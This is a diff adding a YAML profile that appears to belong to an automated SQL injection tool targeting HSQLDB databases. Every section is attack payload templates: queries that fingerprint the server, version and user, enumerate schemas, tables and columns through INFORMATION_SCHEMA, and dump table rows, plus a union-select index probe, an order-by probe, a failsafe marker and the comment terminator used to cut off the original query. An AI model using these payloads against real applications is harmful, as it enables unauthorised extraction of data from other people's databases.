@@ -1,0 +1,135 @@
+vendor: ""
+resource: 
+ info: |
+  select concat(
+      concat_ws(
+          '${ENCLOSE_VALUE_SQL}',
+          DATABASE_VERSION(),
+          CURRENT_SCHEMA,
+          USER()
+      ),
+      '${TRAIL_SQL}'
+  ) r
+  FROM (
+      VALUES(0)
+  )
+ schema: 
+  database: |
+   select concat(
+       group_concat(
+           '${ENCLOSE_VALUE_SQL}'
+           || r
+           || '${SEPARATOR_QTE_SQL}'
+           || convert(q,SQL_VARCHAR)
+           || '${ENCLOSE_VALUE_SQL}'
+           order by r
+           separator '${SEPARATOR_CELL_SQL}'
+       ),
+       '${TRAIL_SQL}'
+   ) r 
+   from (
+       select
+           convert(schema_name, SQL_VARCHAR) r,
+           count(TABLE_NAME) q
+       from INFORMATION_SCHEMA.tables t
+       right join INFORMATION_SCHEMA.schemata s
+       on t.TABLE_SCHEMA = s.schema_name
+       group by r
+       {limit}
+   ) x
+  table: |
+   select concat(
+       group_concat(
+           '${ENCLOSE_VALUE_SQL}'
+           || convert(r,SQL_VARCHAR)
+           || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+           order by r
+           separator '${SEPARATOR_CELL_SQL}'
+       ),
+       '${TRAIL_SQL}'
+   ) r 
+   from (
+       select TABLE_NAME r
+       from information_schema.tables
+       where TABLE_SCHEMA = '${DATABASE}'
+       order by r
+       {limit}
+   ) x
+  column: |
+   select concat(
+       group_concat(
+           '${ENCLOSE_VALUE_SQL}'
+           || convert(n,SQL_VARCHAR)
+           || '${SEPARATOR_QTE_SQL}'
+           || 0
+           || '${ENCLOSE_VALUE_SQL}'
+           order by n
+           separator '${SEPARATOR_CELL_SQL}'
+       ),
+       '${TRAIL_SQL}'
+   ) r 
+   from (
+       select COLUMN_NAME n
+       from information_schema.columns
+       where TABLE_SCHEMA = '${DATABASE}'
+       and TABLE_NAME = '${TABLE}'
+       order by n
+       {limit}
+   ) x
+  row: 
+   query: |
+    select concat(
+        group_concat(
+            '${ENCLOSE_VALUE_SQL}'
+            || r
+            || '${SEPARATOR_QTE_SQL}'
+            || convert(q,SQL_VARCHAR)
+            || '${ENCLOSE_VALUE_SQL}'
+            order by r
+            separator '${SEPARATOR_CELL_SQL}'
+        ),
+        '${TRAIL_SQL}'
+    ) r
+    from (
+        select
+            convert(${FIELDS}, SQL_VARCHAR) r,
+            count(*) q
+        from ${DATABASE}.${TABLE}
+        group by r
+        {limit}
+    ) x
+   fields: 
+    field: "trim(ifnull(convert(${FIELD}, SQL_VARCHAR), ''))"
+    concat: "|| '%7f' ||"
+strategy: 
+ configuration: 
+  slidingWindow: |
+   select 
+       '${LEAD}' 
+       || substr(
+           r,
+           ${INDEX},
+           /**
+            * Minus '${LEAD}' should apply
+            */
+           ${CAPACITY}
+       )
+   from (
+       ${INJECTION}
+   ) x
+  limit: "limit ${LIMIT}, 65536"
+  failsafe: |
+   select
+       (1337${INDICE}7330%2b1) 
+       || '' r 
+   FROM (VALUES(0))
+  calibrator: "repeat('${CALIBRATOR_SQL}', 1024)"
+  limitBoundary: 0
+  endingComment: "--+-"
+  fingerprint: 
+   errorMessage: 
+    - HSQLDB
+ normal: 
+  indices: "union select ${RESULT_RANGE} from (${INDICE_UNIQUE}) b"
+  capacity: "('${LEAD}' || ${INDICE} || ${CALIBRATOR})"
+  orderBy: "order by 1337"
